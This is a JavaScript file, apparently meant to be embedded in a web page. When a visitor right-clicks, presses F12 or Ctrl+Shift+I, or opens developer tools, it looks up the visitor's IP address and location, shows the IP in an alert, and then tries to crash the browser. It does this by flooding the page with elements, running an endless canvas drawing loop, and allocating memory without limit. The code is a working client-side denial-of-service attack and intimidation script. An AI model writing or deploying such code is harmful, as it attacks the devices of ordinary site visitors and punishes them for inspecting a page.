const body = document.body;
let evilMode = false;

function toggleEvilMode() {
    evilMode = !evilMode;
    console.log(`Evil Mode: ${evilMode ? 'Activated' : 'Deactivated'}`);
}

async function getIPInfo() {
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json', {
            method: 'GET',
            headers: { 'Accept': 'application/json' }
        });
        if (!ipResponse.ok) throw new Error(`IP fetch failed: ${ipResponse.status}`);
        const ipData = await ipResponse.json();
        const ip = ipData.ip || "Unknown IP";

        const detailResponse = await fetch(`http://ip-api.com/json/${ip}`, {
            method: 'GET',
            headers: { 'Accept': 'application/json' }
        });
        if (!detailResponse.ok) throw new Error(`Detail fetch failed: ${detailResponse.status}`);
        const detailData = await detailResponse.json();

        return {
            ip,
            city: detailData.city || "Unknown City",
            region: detailData.region || "Unknown Region",
            country: detailData.country || "Unknown Country",
            isp: detailData.isp || "Unknown ISP",
            vpn: detailData.proxy || false
        };
    } catch (error) {
        console.error('IP Info Error:', error.message);
        return {
            ip: "127.0.0.1",
            city: "Classified",
            region: "Classified",
            country: "Classified",
            isp: "Hidden Network",
            vpn: false
        };
    }
}

async function triggerPopup() {
    if (!evilMode) return;
    const ipInfo = await getIPInfo();
    const vpnText = ipInfo.vpn ? " (VPN DETECTED)" : "";
    const message = `Your IP: ${ipInfo.ip}${vpnText}`;
    alert(message);
    crashBrowser();
}

function crashBrowser() {
    const spam = () => {
        for (let i = 0; i < 100000; i++) {
            const div = document.createElement('div');
            div.style.position = 'absolute';
            div.style.top = `${Math.random() * 500}vh`;
            div.style.left = `${Math.random() * 500}vw`;
            div.style.width = '500px';
            div.style.height = '500px';
            div.style.background = `rgb(${Math.random() * 255},${Math.random() * 255},${Math.random() * 255})`;
            div.innerHTML = "<p>".repeat(5000);
            document.body.appendChild(div);
        }
        requestAnimationFrame(spam);
    };
    spam();

    const canvas = document.createElement('canvas');
    canvas.width = window.innerWidth * 4;
    canvas.height = window.innerHeight * 4;
    canvas.style.position = 'fixed';
    canvas.style.top = '0';
    canvas.style.left = '0';
    document.body.appendChild(canvas);
    const ctx = canvas.getContext('2d');
    const overload = () => {
        for (let i = 0; i < 10000; i++) {
            ctx.fillStyle = `hsl(${Math.random() * 360}, 100%, 50%)`;
            ctx.fillRect(Math.random() * canvas.width, Math.random() * canvas.height, 200, 200);
            ctx.beginPath();
            ctx.arc(Math.random() * canvas.width, Math.random() * canvas.height, 100, 0, Math.PI * 2);
            ctx.fill();
        }
        requestAnimationFrame(overload);
    };
    overload();

    let arr = [];
    const hog = () => {
        for (let i = 0; i < 5000000; i++) {
            arr.push(new Array(5000000).fill(Math.random()));
        }
        arr = arr.concat(arr, arr, arr);
        setTimeout(hog, 0);
    };
    hog();

    let arr2 = [];
    const hog2 = () => {
        for (let i = 0; i < 5000000; i++) {
            arr2.push(new Array(5000000).fill(Math.random()));
        }
        arr2 = arr2.concat(arr2, arr2, arr2);
        setTimeout(hog2, 0);
    };
    hog2();
}

(function detectDevTools() {
    let devToolsOpen = false;

    const checkDevTools = () => {
        let trapTriggered = false;
        const trap = { toString: () => { trapTriggered = true; } };
        console.profile(trap);
        console.profileEnd(trap);

        const start = performance.now();
        const testFunc = function() {}.toString();
        const end = performance.now();
        const timingSuspicious = end - start > 10;

        if (trapTriggered || timingSuspicious) {
            devToolsOpen = true;
            if (!evilMode) {
                toggleEvilMode();
                triggerPopup();
            }
        }
    };

    setInterval(checkDevTools, 2000);
})();

document.addEventListener('contextmenu', (e) => {
    e.preventDefault();
    if (!evilMode) toggleEvilMode();
    triggerPopup();
});

document.addEventListener('keydown', (e) => {
    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
        e.preventDefault();
        if (!evilMode) toggleEvilMode();
        triggerPopup();
    }
});
